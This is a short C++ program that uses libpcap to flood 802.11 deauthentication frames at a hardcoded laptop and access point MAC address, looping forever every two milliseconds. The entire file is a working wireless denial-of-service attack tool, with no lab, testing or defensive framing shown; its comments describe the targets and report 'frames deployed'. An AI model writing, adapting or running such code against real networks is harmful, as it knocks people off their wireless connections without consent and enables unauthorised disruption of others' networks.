#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <pcap.h>
#include <unistd.h>

const uint8_t eth_radiotap[26] = {
    0x00, 0x00, 0x1a, 0x00, 0x2f, 0x40, 0x00, 0xa0, 
    0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x85, 0x09, 
    0xa0, 0x04, 0xb0, 0x00, 0x10, 0x00, 0x00, 0x00, 
    0x10, 0x00
};

int main() {
    // --- HARDCODED TARGETS ---
    const char* wifi_card = "wlp2s0";
    uint8_t target_sta[6] = {0xc8, 0xb2, 0x9b, 0x0d, 0x65, 0xe2}; // Laptop Target
    uint8_t target_bssid[6] = {0xfc, 0x01, 0x2c, 0xee, 0x1c, 0x39}; // Non-disruptive AP

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* air_tx = pcap_open_live(wifi_card, BUFSIZ, 1, 1, errbuf);
    if (!air_tx) {
        std::cerr << "[-] Driver interface allocation failed: " << errbuf << std::endl;
        return 1;
    }

    std::cout << "[*] ENGINE ACTIVE -> INJECTING ISOLATED DEAUTH ON INTERFACE: " << wifi_card << "\n";
    uint64_t frame_count = 0;

    while (true) {
        std::vector<uint8_t> raw_frame;
        raw_frame.insert(raw_frame.end(), eth_radiotap, eth_radiotap + 26);

        uint8_t frame_control[2] = {0xc0, 0x00}; // Type: Management, Subtype: Deauth
        uint8_t frame_duration[2] = {0x00, 0x00};
        uint8_t drop_reason[2] = {0x07, 0x00};  // Reason 7: Disassociated due to inactivity

        raw_frame.insert(raw_frame.end(), frame_control, frame_control + 2);
        raw_frame.insert(raw_frame.end(), frame_duration, frame_duration + 2);
        raw_frame.insert(raw_frame.end(), target_sta, target_sta + 6);
        raw_frame.insert(raw_frame.end(), target_bssid, target_bssid + 6);
        raw_frame.insert(raw_frame.end(), target_bssid, target_bssid + 6);
        
        uint8_t sequence_control[2] = {0x00, 0x00};
        raw_frame.insert(raw_frame.end(), sequence_control, sequence_control + 2);
        raw_frame.insert(raw_frame.end(), drop_reason, drop_reason + 2);

        pcap_sendpacket(air_tx, raw_frame.data(), raw_frame.size());
        frame_count++;

        if (frame_count % 500 == 0) {
            std::cout << "\r[+] Injection benchmark: " << frame_count << " frames deployed..." << std::flush;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(2));
    }

    pcap_close(air_tx);
    return 0;
}
